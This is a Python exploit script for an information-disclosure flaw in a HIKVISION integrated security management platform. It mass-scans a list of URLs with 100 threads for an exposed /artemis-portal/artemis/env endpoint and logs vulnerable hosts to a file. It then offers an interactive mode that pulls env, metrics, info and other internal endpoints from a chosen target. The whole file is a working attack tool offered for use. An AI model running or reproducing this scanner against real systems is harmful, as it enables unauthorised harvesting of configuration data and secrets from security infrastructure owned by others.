import argparse,requests,sys,time,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'
def banner():
    text="""       ____.__            ____.__        
    |    |__| ____     |    |__| ____  
    |    |  |/ __ \    |    |  |/ __ \ 
/\__|    |  \  ___//\__|    |  \  ___/ 
\________|__|\___  >________|__|\___  >
                 \/                 \/ 

     
writer:杰杰宝贝
"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description='HiKVISION integrated security management platform env information leakage')
    parser.add_argument('-u','--url',dest='url',type=str,help="your one url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file name ')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
             exp(args.url)

    elif args.file and not args.url:
        urllist = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                urllist.append(url.strip())
        mp = Pool(100)
        mp.map(poc,urllist)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    try:
        payload = "/artemis-portal/artemis/env"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Connection': 'close'
        }
        res = requests.get(url=target+payload,headers=headers,verify=False)
        #print(res.text)
        res1 = json.loads(res.text)
        #print(res1)
        if res1['profiles'] == ['prod']:
            print(f'{GREEN}[+]{target}---There is a sensitive information disclosure vulnerability{RESET}')
            with open ('hik.txt','a',encoding='utf-8') as fp:
                        fp.write(target+'\n')
                        return True
        else:
            print(f'[-]{target}---There is no sensitive information leakage vulnerability')
    except Exception as e:
        print(f"{target}There is a problem with your website, please test it manually")
        print(f"error message: {str(e)}")
def exp(target):
    try:
        while True:
            interface = input("请输入你要查找的接口的信息：比如 env  metrics   metrics/http.server.requests info等等 并输入退出")
            payload = f"/artemis-portal/artemis/{interface}"
            headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
                    'Connection': 'close'
                }
            if interface == 'q' :
                exit()
            res = requests.get(url=target+payload,headers=headers,verify=False)
            res2 = json.loads(res.text)
            print(f"{GREEN}您查询到的{interface}接口信息为：{res2}{RESET}")
            #print(res.text)
    except:
        print("你输入的接口不对")

if __name__ == '__main__' :
    main()